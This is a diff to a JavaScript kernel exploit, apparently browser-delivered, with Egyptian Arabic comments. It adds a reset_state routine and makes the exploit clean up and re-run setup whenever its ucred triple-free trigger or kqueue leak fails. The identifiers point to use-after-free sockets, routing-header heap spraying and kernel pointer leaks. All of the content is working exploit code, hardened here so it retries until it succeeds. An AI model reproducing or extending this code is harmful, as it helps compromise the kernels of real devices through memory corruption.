@@ -998,6 +998,33 @@ function setup_log_screen() {
     ws.broadcast(msg);
   };
 }
+function reset_state() {
+  cleanup_called = false;
+
+  twins[0] = -1;
+  twins[1] = -1;
+
+  triplets[0] = -1;
+  triplets[1] = -1;
+  triplets[2] = -1;
+
+  uaf_socket = -1;
+  kq_fdp = new BigInt(0);
+  kl_lock = new BigInt(0);
+
+  if (leak_rthdr && !leak_rthdr.eq(0)) {
+    fill_buffer_64(leak_rthdr, 0, 0x100);
+  }
+
+  if (spray_rthdr && !spray_rthdr.eq(0)) {
+    fill_buffer_64(spray_rthdr, 0, spray_rthdr_len);
+  }
+
+  prev_core = -1;
+  prev_rtprio = 0;
+
+  exploit_count = 0;
+}
 function yield_to_render(callback) {
   if (exploit_end) return;            // ← لو خلصنا، امنع أي فازة متأخرة
   if (typeof callback !== 'function') return;
@@ -1059,6 +1086,15 @@ function exploit_phase_trigger() {
   log('Triggering... (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')');
 
   if (!trigger_ucred_triplefree()) {
+    log('Triplefree failed — resetting state...');
+    cleanup(true);        // قتل الثريدات + قفل السوكتس
+    // ممكن تضيف reset_state() هنا لو عاملها زي ما اتكلمنا قبل كده
+    var ok = setup();     // تهيئة من جديد
+    if (!ok) {
+      log('Setup failed after triplefree — aborting.');
+      exploit_end = true;
+      return;
+    }
     yield_to_render(exploit_phase_trigger);
     return;
   }
@@ -1070,7 +1106,15 @@ function exploit_phase_leak() {
   if (exploit_end) return;
 
   if (!leak_kqueue_safe()) {
-    log('Leak failed — retrying...');
+    log('Leak failed — full reset & retry...');
+    cleanup(true);
+    // reset_state(); // لو عاملها
+    var ok = setup();
+    if (!ok) {
+      log('Setup failed after leak — aborting.');
+      exploit_end = true;
+      return;
+    }
     yield_to_render(exploit_phase_trigger);
     return;
   }
